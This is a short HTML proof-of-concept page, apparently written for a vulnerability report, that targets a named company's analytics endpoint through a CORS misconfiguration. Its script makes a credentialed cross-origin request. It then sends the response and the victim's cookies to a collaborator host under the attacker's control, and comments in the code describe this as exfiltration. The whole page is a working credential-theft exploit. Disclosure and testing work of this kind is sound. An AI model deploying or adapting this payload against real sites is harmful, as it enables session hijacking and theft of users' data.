<html>
  <body>
    <h1>POC: CORS + Credential Theft</h1>
    <script>
      fetch("https://sp.yelp.com/com.snowplowanalytics.snowplow/tp2", {
        method: "POST",
        credentials: "include", // send victim's cookies
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          schema: "iglu:com.snowplowanalytics.snowplow/atomic/jsonschema/1-0-0",
          data: [{ e: "pv", url: "https://evil.com/cors-poc" }]
        })
      })
      .then(r => r.text())
      .then(d => {
        // Exfiltrate response + cookies to attacker server
        fetch("https://your-collab-id.oastify.com/log?resp=" + btoa(d) + "&c=" + document.cookie);
      });
    </script>
  </body>
</html>
